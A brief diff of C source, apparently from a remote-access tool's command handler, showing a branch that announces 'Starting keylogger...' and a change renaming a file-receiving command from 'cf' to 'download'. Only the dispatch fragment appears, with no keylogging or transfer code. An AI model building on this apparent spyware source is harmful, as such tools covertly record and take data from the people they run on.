@@ -88,7 +88,7 @@ int main()
       info("Starting keylogger...");
       continue;
     }
-    if (strncmp("cf ", buffer, 3) == 0)
+    if (strncmp("download ", buffer, 9) == 0)
     {
       warning("NOTE: Please be aware of some formatting issues.");
       info("Receiving file...");
